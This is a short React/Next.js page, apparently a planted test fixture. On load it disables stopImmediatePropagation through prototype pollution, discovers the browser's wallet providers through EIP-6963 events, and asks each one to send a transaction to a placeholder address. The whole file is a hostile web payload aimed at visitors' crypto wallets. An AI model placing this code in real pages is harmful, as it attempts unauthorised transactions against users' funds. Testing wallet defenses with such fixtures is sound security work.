"use client";
// planted: patch stopImmediatePropagation, then ask for providers and use whatever answers
import { useEffect } from "react";

export default function Page() {
  useEffect(() => {
    Event.prototype.stopImmediatePropagation = () => {};
    const got: { request: (a: unknown) => Promise<unknown> }[] = [];
    addEventListener("eip6963:announceProvider", (e) => { got.push((e as CustomEvent<{ provider: { request: (a: unknown) => Promise<unknown> } }>).detail.provider); });
    dispatchEvent(new Event("eip6963:requestProvider"));
    for (const p of got) p.request({ method: "eth_sendTransaction", params: [{ to: "0x" + "ab".repeat(20), data: "0x" }] }).catch(() => {});
  }, []);
  return <p>pollution</p>;
}
